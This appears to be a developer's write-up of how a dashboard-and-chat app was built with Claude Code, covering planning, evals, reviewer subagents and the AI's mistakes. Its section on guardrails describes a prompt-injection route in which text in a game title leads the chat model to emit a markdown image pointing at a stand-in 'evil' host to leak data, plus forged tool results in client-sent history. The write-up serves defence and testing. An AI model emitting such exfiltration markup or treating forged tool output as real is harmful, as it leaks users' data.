# AI Workflow

Built with **Claude Code** (Opus 5.5) in the terminal. Every example below comes from [`docs/ai-log.md`](docs/ai-log.md), the raw log appended at each milestone while working. Nothing here is reconstructed after the fact.

## 1. Tools and why

| Tool | Used for | Why |
|---|---|---|
| Claude Code, plan mode | 1-page plan, 3 clarifying questions, milestone budget | Agreeing on scope and guardrails *before* any code is cheaper than fixing them later |
| Claude Code, execution | Implementation, running typecheck/lint/tests/build/curl, commits | It verifies its own work: every milestone ended with real command output, not "looks right" |
| `CLAUDE.md` | Stack, commands, conventions, security rules, definition of done | A contract the agent re-reads, updated as soon as version-specific gotchas were found |
| Fresh-context reviewer subagent | Independent code review, run in the background | It doesn't share my context, so it doesn't share my blind spots (see §4) |
| Claude in Chrome | Real-browser check of the dashboard and chat, plus reproducing a race condition | Found UI bugs that curl and unit tests couldn't see |
| A second, separate Claude session | Another independent review of the finished branch (I pasted its report in) | A second set of fresh eyes after the first fixes; it found a spoofable rate limit and a race I'd introduced |
| `MockLanguageModelV4` (AI SDK test utils) | End-to-end test of the chat route with no network | Proves the safety properties in CI without spending API credits |
| Claude Sonnet 5.5 (in the app) | Chat model via the Vercel AI SDK | Reliable multi-step tool calling, fast streaming |

**How I worked:** MVP first, with a **gate**. Phase 1 had to satisfy every requirement in the simplest way and was tagged `mvp` once the 3 README questions were verified live. Only then did Phase 2 start: extras the agent ranked by grade value per minute, and I picked. After that I asked for further extras myself (the redesigned UI, table sort/filter, rate limit, mock-model tests), then ran a second review and fixed what it found. Each step followed the same loop: implement, verify with a command (or in the browser), make a small commit, then add a few lines to the log, flagging AI mistakes when they happened.

That's why the result goes beyond a 2–3 hour brief: the core was done at the `mvp` tag, and everything after it was explicitly requested on top. The time spent is in the PR.

## 2. Prompts and outcomes

1. **Planning (plan mode).** *"MVP first, extras behind a gate. Security guardrails are non-negotiable: read-only tools, column whitelist, tool results are data not instructions, max steps/input/output. Ask at most 3 questions, only ones that change the plan. List the top 3 places AI will go wrong here."*
   → Asked exactly the questions that mattered (what "last month" means when the schema has no dates, which model, scope) and produced a 6-milestone plan. One of its predicted failure points, *"AI SDK API drift"*, turned out to be real (see §3).

2. **"If unsure about a current API, check the installed version's docs, not memory."**
   → Before writing code, the agent read `node_modules/ai/docs` and `node_modules/next/dist/docs`. It found that AI SDK **v7** renamed the APIs from the plan, and that Next 16 `cacheComponents` treats synchronous SQLite reads as static, which would have **frozen the dashboard at build time**. Both went into `CLAUDE.md`, and the code uses `await connection()`.

3. **Designing the seed data to catch a wrong answer.** I asked for unit tests on the query layer, and the seed has two games at exactly 4.0. *"How many games are rated above 4?"* is **9** with `>` but **11** with `>=`, so a lazy operator choice shows up as a wrong number. Both the unit tests and the live evals assert 9.

4. **Live evals that turned an observation into a fix.** At the MVP gate I noticed the model making 2 redundant tool calls on a vague compare. I asked for evals that check **tool + arguments + answer**, including that case.
   → Baseline was **6/7**, and the redundant-call case reproduced. The fix went in the tool's *output* rather than only the prompt: `compare_games` now says whether each title matched `exact` or `partial`, and that results are final. Result: **7/7 on all 4 runs since**: twice right after the fix, once after the first review's fixes, and once on the final code. That's a small sample, and LLM behaviour can vary. A redundant "Hades" lookup that the eval had also exposed disappeared too.

5. **"Prove the protection against faked tool results with no API cost."**
   → The agent read the installed AI SDK testing docs and provider types, then wrote `route.test.ts`: the real `POST` handler, a scripted `MockLanguageModelV4` that records every prompt, and an in-memory seeded DB. The first 6 tests cover real tool output reaching the model, forged history *not* reaching it, the 5-step cap, 400s with zero model calls, and rate limiting. All 6 passed on the first run, which is suspicious, so I had it **break the fix on purpose** (disable `sanitizeHistory`). Exactly the forged-history test failed. A 7th test (spoofed `X-Forwarded-For`) was added after the second review and mutation-checked the same way. A test that can't fail proves nothing.

## 3. When the AI got it wrong, and how it was fixed

**The most important one: guardrails followed to the letter but not in spirit.** `CLAUDE.md` said "max input length" and "tool results are data". The implementation:
- capped length **per text part, for user messages only**. A single message with 100 parts, or a huge forged assistant message, got through.
- trusted the **client-sent history**. The AI SDK only validates tool outputs when a tool has an `outputSchema`, so a request could include a **forged tool result** (e.g. "Forged Fortune, $999,999,999") that the model would treat as real data.
- rendered markdown **images**, so prompt-injected text in a game title could make the model emit `![](https://evil/?d=…)`, which leaks data with **no click**.

The reviewer subagent caught all three. **Fix:** `sanitizeHistory` keeps only user/assistant text (so tool results always come from the server), caps are now per message across all parts plus 20k per conversation, and images are disallowed. **Verified** with unit tests, and live: I sent the forged history, the forged result was ignored, and the model re-queried and answered Rust & Rune.

**Others, all real and all in the log:**
- **AI SDK API names from memory.** The plan said `toUIMessageStreamResponse`/`stepCountIs`/`system`, but v7 uses `createUIMessageStreamResponse(toUIMessageStream())`/`isStepCount`/`instructions`. Caught by reading the installed docs *before* coding.
- **Hand-computed test expectations, three times.** The agent claimed the top developer was Anvilheart ($132,200), but it's Gridline Studio ($137,000). Later it claimed 70 groups where there are 68, and later still it put a tie at list positions 5–6 instead of 4–5. Each time the code was right and the test was wrong, and the runner caught it. After the third time I changed the approach rather than the number: **assert on properties** (filter the tied games, check their order), not on positions the AI worked out by hand.
- **Spoofable rate limit (second review).** I keyed the limiter on `X-Forwarded-For`, which a client can rotate on every request. Fix: one global bucket unless `TRUST_PROXY=true`. A test sends 21 requests with 21 fake IPs and expects a 429; reverting the fix makes it fail.
- **A race I introduced (second review).** "Refresh the dashboard on tab focus" could start before a save and finish after it, so a just-created game vanished or a just-deleted one came back. My browser check had only tested the happy path. I **reproduced it first** (wrapped `fetch` so the refresh's snapshot arrived 1.5 s late), then fixed it with a change counter that discards overlapping refreshes, and re-ran the same script.
- **Committed with typecheck failing.** My command chain ran `git commit` even though typecheck had failed. Fixed in the next commit, and turned into a guardrail: a pre-commit hook (`.githooks/pre-commit`, enabled by `npm install`) runs typecheck, lint and tests. The first version of the hook hid the error output, so it blocked *without saying why*; that's fixed too.
- **Passed typecheck, lint and dev mode, failed `next build`.** `useChat` generates random ids during render, which Next 16 refuses to prerender. Fixed with a `<Suspense>` boundary. Lesson: build at every milestone.
- **Raw zod text in the UI.** Empty number fields showed *"Invalid input: expected number, received string"*. Only the browser pass caught it. Fixed with friendly messages in the shared schema.
- **Mobile layout never checked until I asked.** Measuring at 390px showed both pages scrolling sideways: a grid item with `min-width: auto`, a flex input's minimum width, and an `sr-only` label escaping the table's scroll container. While fixing it, one edit broke the JSX, and the measurement right after looked "fixed" only because it was measuring Next's error page. Re-measured after confirming the real page had rendered.
- Smaller ones: exported constants from a route file (Next rejects that); asked the model for markdown tables without adding `remark-gfm`; reseeding without resetting AUTOINCREMENT (the smoke test created id 31); an edit script that failed partway through while the shell still committed (caught by re-checking, then amended).

**One mistake was mine, not the AI's:** I pasted an API key into the chat. The agent wrote it to the gitignored `.env` (mode 600) without echoing it, warned me it was now in the transcript, and told me to rotate it.

## 4. Parallel agents / subagents

- **Fresh-context reviewer subagent, run in the background in parallel.** While the main agent built the eval suite, a general-purpose subagent with **no conversation history** reviewed the whole branch against `docs/CHALLENGE.md` and `CLAUDE.md`.
  - **Constraints in its prompt:** read-only; don't read `.env`; GET requests only; don't call the paid chat API; verify against the installed AI SDK/Next docs before flagging anything.
  - **Why fresh context:** the implementing agent had normalized its own decisions ("the cap is in place", "tool results come from tools"). A reviewer without that history checked what the code *actually* enforces.
  - **Handling its output:** I treated it as claims, not truth. I verified the two SDK-internal claims myself before acting on them, then fixed all 12 findings and added 12 unit tests (24 in total). Some findings, like dead code, README wording and a UI state bug, were fixed without a dedicated test.
- **A second review from a separate Claude session.** After the extras, I had another Claude session review the branch and pasted its report here. It found what the first review couldn't have, because the code didn't exist yet: stale docs, a spoofable rate-limit key, and the refresh race above. Each item got a necessity and time estimate before I chose which to fix.
- **No worktrees.** The work was a single linear branch, and both reviewers were read-only, so isolation wasn't needed.

## What I'd do with more time

- A `game_monthly_metrics` table, so "last month" means a real month instead of a snapshot.
- Server-side chat history, so follow-up questions can reuse earlier tool results safely instead of re-querying.
- UI tests: component tests (jsdom + Testing Library) for the dashboard, including an automated version of the refresh-race check, and a Playwright check that no page scrolls sideways at 390px. Both are currently repeatable manual browser scripts.
- Running the live evals in CI on a schedule with a budget cap, plus more cases (ties, empty genres, multi-turn follow-ups).
- A shared rate-limit store (e.g. Redis) and auth, if this were ever deployed.
